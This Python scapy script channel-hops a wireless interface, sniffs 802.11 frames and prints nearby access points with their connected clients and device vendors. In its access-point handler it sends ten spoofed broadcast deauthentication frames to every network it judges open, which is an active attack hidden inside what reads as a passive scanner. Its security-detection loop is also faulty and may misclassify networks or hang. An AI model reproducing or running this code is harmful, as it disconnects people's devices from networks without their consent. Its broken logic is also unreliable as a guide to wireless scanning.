from scapy.all import *
import os
import time


obtained_ap = {}
iface = "wlan0"
conf.verb = 0
non_bssids = ("ff:ff:ff:ff:ff:ff", "00:00:00:00:00:00", "33:33:00:00:00:16")
fopen = open('mac_prefix').read().split('\n')

def detect_mac_device(mac):
	for i in fopen:
		row = i.split('|')
		pref, device = row[0], row[1]
		mac_pref = ''.join(mac.split(':')[:3]).upper()
		if pref == mac_pref:
			return device
	return "unknown"

def channel_hop():
	for i in range(14):
		os.system(f"iwconfig {iface} channel {i}")
		sniff(iface=iface, count=15, prn=obtain_ap_and_clients_handler)

def show_tree(obtained_ap):
	time.sleep(.5)
	os.system('clear')
	for i in obtained_ap:
		print(f"{obtained_ap[i]['bssid']}({obtained_ap[i]['type']})  {obtained_ap[i]['channel']}\t{obtained_ap[i]['sec']}\t{obtained_ap[i]['essid']}")
		for client in obtained_ap[i]['clients']:
			print(f"\t{client} - {obtained_ap[i]['clients'][client]['device']}")

def add_ap(packet):
	global obtained_ap
	bssid = packet[Dot11].addr3
	info = packet[Dot11Elt]
	sec = packet.sprintf("{Dot11Beacon:%Dot11Beacon.cap%}"
						"{Dot11ProbeResp:%Dot11ProbeResp.cap%}").split('+')
	essid, chan = packet[Dot11Elt].info, ord(packet[Dot11Elt:3].info)
	secs = set()
	while isinstance(packet, Dot11Elt):
		if info.ID == 48:
			secs.add('WPA2')
		elif info.ID == 221 and info.info.startswith("\x00P\xf2\x01\x01\x00"):
			secs.add('WPA')
	if not secs:
		if 'privacy' in sec:
			secs.add('WPA/WPA2')
		else:
			secs.add('OPEN')
			for i in range(10):
				sendp(RadioTap()/Dot11(type=0, subtype=12, addr1="FF:FF:FF:FF:FF:FF", addr2=bssid, addr3=bssid)/Dot11Deauth(reason=5))

	for i in obtained_ap:
		obtained_ap[i]['sign'] -= 1
	obtained_ap = {x:obtained_ap[x] for x in filter(lambda x: obtained_ap[x]['sign'] > 0, obtained_ap)}
	if bssid not in obtained_ap:
		obtained_ap[bssid] = {'essid': essid, 'bssid': bssid, 'channel': chan, 'clients': {}, 'sec': '/'.join(secs), 'sign': 20, 'type': detect_mac_device(bssid)}
	else:
		obtained_ap[bssid]['sign'] += 1

def obtain_ap_and_clients_handler(packet):
	if not packet.haslayer(Dot11):
		return
	bssid = packet[Dot11].addr3
	if not packet.addr1 or not packet.addr2:
		return
	if packet.haslayer(Dot11Beacon) or packet.haslayer(Dot11ProbeResp):
		add_ap(packet)
	# filter packets based on their mac address
	if packet.addr1 in non_bssids or packet.addr2 in non_bssids:
		return
	if packet.type in (1, 2):
		client = packet.addr1
		bssid = packet.addr2
		if bssid in obtained_ap:
			if client not in obtained_ap[bssid]['clients']:
				obtained_ap[bssid]['clients'][client] = {}
				obtained_ap[bssid]['clients'][client]['device'] = detect_mac_device(client)
	else:
		return
	show_tree(obtained_ap)

if __name__ == '__main__':
	os.system('clear')
	while True:
		channel_hop()